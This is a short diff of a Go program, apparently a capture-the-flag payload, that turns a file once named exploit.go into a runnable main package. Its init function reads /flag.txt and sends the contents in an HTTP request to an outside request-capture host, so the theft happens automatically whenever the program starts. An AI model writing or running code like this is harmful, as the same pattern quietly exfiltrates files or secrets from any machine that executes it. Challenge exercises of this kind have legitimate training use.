@@ -1,5 +1,4 @@
-// file: exploit.go
-package exploit
+package main
 
 import (
     "io/ioutil"
@@ -10,3 +9,5 @@ func init() {
     data, _ := ioutil.ReadFile("/flag.txt")
     http.Get("https://anas0x1.free.beeceptor.com/?flag=" + string(data))
 }
+
+func main() {}
